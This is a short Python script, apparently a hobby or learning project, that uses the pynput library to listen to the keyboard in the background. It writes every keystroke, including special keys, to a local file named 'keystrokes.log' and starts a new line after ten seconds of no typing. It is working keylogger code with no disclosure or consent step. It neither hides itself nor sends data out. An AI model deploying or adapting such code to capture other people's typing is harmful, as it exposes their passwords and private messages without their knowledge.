from pynput.keyboard import Key, Listener
from threading import Timer
# file_thread = threading.Thread(target=write_to_file, args=None)
# file_thread.start()

no_keystrokes = None

def write_to_file(key):
    if key is not None:
        with open("keystrokes.log", "a") as file:
            file.write(key)
    else:
        print("key is none")


def write_newline():
    print("Jumping a new line")
    with open("keystrokes.log", "a") as file:
        file.write("\n")  


def on_press(key):
    global no_keystrokes
    if no_keystrokes is not None:
        no_keystrokes.cancel()
    try:
        key_str = key.char
    except AttributeError:
        print(f"Special key {key} pressed")
        key_str = str(key).replace("Key.", "")

    write_to_file(key_str)
    no_keystrokes = Timer(10, write_newline)
    no_keystrokes.start()


# Set up the listener
listener = Listener(on_press=on_press)
listener.start()  # Starts listening in the background

while True:
    pass
